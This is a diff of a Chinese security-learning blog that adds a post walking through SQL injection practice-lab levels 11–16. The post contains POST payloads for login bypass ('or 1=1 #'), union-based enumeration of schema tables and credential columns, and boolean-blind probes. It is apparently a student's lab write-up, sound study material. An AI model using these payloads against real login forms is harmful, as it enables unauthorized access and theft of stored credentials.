@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -167,6 +167,122 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/less11-16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/06/less11-16/" class="post-title-link" itemprop="url">less11-16</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-11-06 11:00:03" itemprop="dateCreated datePublished" datetime="2021-11-06T11:00:03+08:00">2021-11-06</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-11-10 19:49:56" itemprop="dateModified" datetime="2021-11-10T19:49:56+08:00">2021-11-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="less-11"><a href="#less-11" class="headerlink" title="less 11"></a>less 11</h1><p>这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.</p>
+<p><img src="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png" alt="QQ截图20211106114439.png"></p>
+<p>代理抓包发现题与以往不同</p>
+<p>以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password</p>
+<p>但是本质上还是之前的报错注入，不过是基于post的提交方式</p>
+<p><img src="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png" alt="QQ截图20211106115325.png"></p>
+<p>利用抓包得到的信息可知上传的data为：uname=&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>所以基于此，进行报错注入</p>
+<p>首先我们不知道账号密码，利用注释符和 or 1=1使其为真</p>
+<p>uname=n‘ or 1=1 #&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>这样无论账号存不存在都可以登入（猜的）</p>
+<p>事实也是这样，这里返回了账号密码和我们输入的不一样，但是我们知道我们成功登入了，注释符以前的內容是可执行的这样接下来就是类似less1的内容</p>
+<p>order by n 查看列数</p>
+<p>union select 1，2，。。n查看回显</p>
+<p>按照回显来嵌套</p>
+<p>select database();</p>
+<p>select schema_name from information_schema.schemata;</p>
+<p>select table_name from information_schema.tables where table_schema=’A’;</p>
+<p>select column_name from information_schema.column where table_name=’B’;</p>
+<p>select username,password from where A.B;</p>
+<p>利用group_concat()和concat_ws()来简便操作</p>
+<p><img src="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png" alt="QQ截图20211107111426.png"></p>
+<h1 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h1><p>同理同法，不过是把单引号改为双引号单括号。</p>
+<p>测试注入可以依次测试’  ,  ‘)  ,  ‘))  ,  “  ,  “)  ,  “))六种</p>
+<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>同样操作</p>
+<p>post data：uname=1’) or 1=1#&amp;passwd=1&amp;submit=Submit</p>
+<p>这次没有报错，但也没有回显</p>
+<p>属于布尔盲注</p>
+<p>post data：uname=1’) or length(database()&gt;1#&amp;passwd=1&amp;submit=Submit来判断数据库名长度</p>
+<p>post data：uname=1’) or left（（select schema_name from information_schema.schemata limit 0,1）,1）=’a’#&amp;passwd=1&amp;submit=Submit来判断列名</p>
+<p>PS：or左右两边其中一边为真都为真，已知左为假，所以只有有报错则右边为假就会报错，所以利用此来破解库名，表名，列名。</p>
+<p>利用工具进行爆破详见less5,6总结</p>
+<p>13     (‘’)</p>
+<p>14      “”</p>
+<p>15       ‘’</p>
+<p>16       (“”)</p>
+<p>less13,14,15,16同样的方法只是对数据的包裹方式不同。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1340,86 +1456,6 @@
 ```&lt;form&gt;: 表单
 ```&lt;iframe&gt;: 内联框架
 </code></pre>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/" class="post-title-link" itemprop="url">“冷知识”</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-09-26 08:28:04" itemprop="dateCreated datePublished" datetime="2021-09-26T08:28:04+08:00">2021-09-26</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-26 00:19:36" itemprop="dateModified" datetime="2021-10-26T00:19:36+08:00">2021-10-26</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="冷知识"><a href="#冷知识" class="headerlink" title="冷知识"></a>冷知识</h1><h2 id="冷知识1号-robort-txt中藏着不允许和允许探测的文件名"><a href="#冷知识1号-robort-txt中藏着不允许和允许探测的文件名" class="headerlink" title="冷知识1号: robort.txt中藏着不允许和允许探测的文件名"></a>冷知识1号: robort.txt中藏着不允许和允许探测的文件名</h2><h2 id="冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"><a href="#冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作" class="headerlink" title="冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"></a>冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作</h2><h2 id="冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"><a href="#冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站" class="headerlink" title="冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"></a>冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站</h2><h2 id="冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"><a href="#冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程" class="headerlink" title="冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"></a>冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程</h2><h2 id="HTTP-Referer-告知服务器请求来源（浏览器自动加上）"><a href="#HTTP-Referer-告知服务器请求来源（浏览器自动加上）" class="headerlink" title="HTTP Referer: 告知服务器请求来源（浏览器自动加上）"></a>HTTP Referer: 告知服务器请求来源（浏览器自动加上）</h2><h3 id="302或301状态码表示跳转"><a href="#302或301状态码表示跳转" class="headerlink" title="302或301状态码表示跳转"></a>302或301状态码表示跳转</h3><h3 id="Cookie-服务器颁发的凭证"><a href="#Cookie-服务器颁发的凭证" class="headerlink" title="Cookie: 服务器颁发的凭证"></a>Cookie: 服务器颁发的凭证</h3><h3 id="网页-HTML-JS-CSS"><a href="#网页-HTML-JS-CSS" class="headerlink" title="网页=HTML+JS+CSS"></a>网页=HTML+JS+CSS</h3><h2 id="JS-给网页添加动态效果"><a href="#JS-给网页添加动态效果" class="headerlink" title="JS: 给网页添加动态效果"></a>JS: 给网页添加动态效果</h2><h2 id="CSS-给网页添加样式和图片"><a href="#CSS-给网页添加样式和图片" class="headerlink" title="CSS: 给网页添加样式和图片"></a>CSS: 给网页添加样式和图片</h2><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2><hr>
 
       
     </div>
